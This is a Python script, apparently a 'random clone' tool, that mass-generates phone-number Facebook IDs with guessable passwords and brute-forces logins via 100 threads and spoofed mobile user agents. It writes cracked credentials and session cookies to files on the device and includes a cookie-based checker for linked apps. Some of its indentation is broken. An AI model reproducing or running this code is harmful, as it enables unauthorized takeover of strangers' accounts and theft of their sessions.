import requests,random,re,time,json,os,sys
import os,sys,random,re,time,json,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import sys as s
from time import sleep as waktu
try:
   import requests
   from concurrent.futures import ThreadPoolExecutor as ThreadPool
   import futures
   from requests.exceptions import ConnectionError
  except ModuleNotFoundError:
   os.system('pip install requests futures bs4=2> /dev/null')
   os.system('pip install requests futures bs4')
loop =0
oks =[]
cps =[]
twf =[]
ugen =[]
ugen2 =[]
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    paku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(paku2)
    
    a='Dalvik/1.4.0 (Linux; U; Android'
    b=random.randrange(6, 15)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Android 2.3.4; GT-S5670 Build/GINGERBREAD) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
    pakuu=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
    ugen2.append(pakuu)
cokbrut=[]
ses=requests.Session()

def cek_apk(session,coki):
    w=session.get("https://p.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')


#________________UA______________#
def sex():
	facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fbbv = str(random.randint(10000000, 66666666))
	fbrv = str(random.randint(000000000,999999999))
	density = random.choice(['2.0', '2.5', '3.0'])
	width = random.choice(["720", "1080", "1280"])
	height = random.choice(["720", "1080", "1280", "1440", "1920"])
	ua = f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
 return ua
 
logo =(""" \033[1;80m 
[..       [..[..      [..      [.       [...     [..[..       [..
[. [..   [... [..    [..      [. ..     [. [..   [..[. [..   [...
[.. [.. [ [..  [.. [..       [.  [..    [.. [..  [..[.. [.. [ [..
[..  [..  [..    [..        [..   [..   [..  [.. [..[..  [..  [..
[..   [.  [..    [..       [...... [..  [..   [. [..[..   [.  [..
[..       [..    [..      [..       [.. [..    [. ..[..       [..
[..       [..    [..     [..         [..[..      [..[..       [..
                                                                 
      [.       [.......    
     [. ..     [..    [..  
    [.  [..    [..    [..  
   [..   [..   [. [..      
  [...... [..  [..  [..    
 [..       [.. [..    [..  
[..         [..[..      [..
\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\33[1;91m[\33[1;97m=\33[1;91m] \33[1;92mDEVELOPER\033[1;97m ●   \33[1;92mNO NAME
\33[1;91m[\33[1;97m=\33[1;91m] \33[1;92mFACEBOOK\033[1;97m  ●   \33[1;92mNOT_FOUND
\33[1;91m[\33[1;97m=\33[1;91m] \33[1;92mGITHUB\033[1;97m    ●   \33[1;92m1xxXOXxx1
\33[1;91m[\33[1;97m=\33[1;91m] \33[1;92mVERSION\033[1;97m   ●   \33[1;92m9.0
\33[1;91m[\33[1;97m=\33[1;91m]Dalvik/2.1.0 (Linux; U; Android \33[1;92mTOOLS\033[1;97m     ●   \033[1;92mRANDOM CLONE
\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")

def linex():
        print(f'\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
def k():
    os.system('clear')
    print(logo)
    print('\33[1;91m[\33[1;97m1\33[1;91m] \33[1;92mSTART RANDOM CLONE')                                                   
    print('\33[1;91m[\33[1;97m0\33[1;91m] \33[1;92mEXIT')
    linex()
    XOX =input("\33[1;91m[\33[1;97m√\33[1;91m] \33[1;92mCHOOSE \33[1;97m: \33[1;36m")
    if XOX in ["1", "01"]:
               v2()
    else:
        exit()                                                                                                    

A = '\x1b[1;97m'
B = '\x1b[1;96m'
C = '\x1b[1;91m'
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'
E = '\x1b[1;93m'
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'

def v2():
    user=[]
    os.system('clear')
    print(logo)
    print(f'\33[1;91m[\33[1;97m√\33[1;91m]\33[1;92m SIM CODE\33[1;97m ● \33[1;92m250,890,775,776,780,950 ')
    code = input(f'\33[1;91m[\33[1;97m√\33[1;91m]\33[1;92m CHOOSE \33[1;97m  ● \x1b[1;96m')
    linex()                                                                                                               
    print(f'\33[1;91m[\33[1;97m√\33[1;91m] \33[1;92m LIMIT EXAMPLE \33[1;97m ● \33[1;92m5000,10000,50000 ')
    limit = int(input('\33[1;91m[\33[1;97m√\33[1;91m] \33[1;92m PUT YOUR LIMIT \33[1;97m● \x1b[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=100) as LEE:
        os.system('clear')                                                                                               
        print(logo)
        tl = str(len(user))
        print(f'\33[1;91m[\33[1;97m√\33[1;91m] \33[1;92mSIM CODE \33[1;97m ● \x1b[1;96m'+code)
        print(f'\33[1;91m[\33[1;97m√\33[1;91m] \33[1;92mTOTAL ID \33[1;97m ● \x1b[1;96m'+tl)
        print(f'\33[1;91m[\33[1;97m√\33[1;91m] \33[1;92mUSE AEROPLANE MOOD IN EVERY 4 MIN')
        linex()        
        for love in user:
            uid = '959'+code+love
            pwx = [love,code+love,code+love[:3]]
            LEE.submit(rcrack,uid,pwx,tl)
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            bi = random.choice([A,B,C,D,E,F,G,H])
            cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
            sys.stdout.write(f'\r \033[1;90m[\33[1;92m+__+\033[1;90m]\x1b[1;96m-\033[1;90m[{cl}{loop}\033[1;90m]\x1b[1;96m-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'p.facebook.com',
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
           'accept-language': 'en-US,en;q=0.9',
           'cache-control': 'max-age=0',
           'dpr': '1',
           'sec-ch-prefers-color-scheme': 'dark',
           'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
           'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
           'sec-ch-ua-mobile': '?0',
           'sec-ch-ua-model': '""',
           'sec-ch-ua-platform': '"Linux"',
           'sec-ch-ua-platform-version': '""',
           'sec-fetch-dest': 'document',
           'sec-fetch-mode': 'navigate',
           'sec-fetch-site': 'same-origin',
           'sec-fetch-user': '?1',
           'upgrade-insecure-requests': '1',
           'user-agent': pro,}
            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=111&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f"\033[38;5;46m=[OK]= {uid}|{ps}\n\033[1;32m=[COOKIE-💙]= \033[1;31m{coki}")
                open('/sdcard/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m=[💔]= {uid}|{ps}")
                open('/sdcard/Cp.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        
    except:
        pass
k()
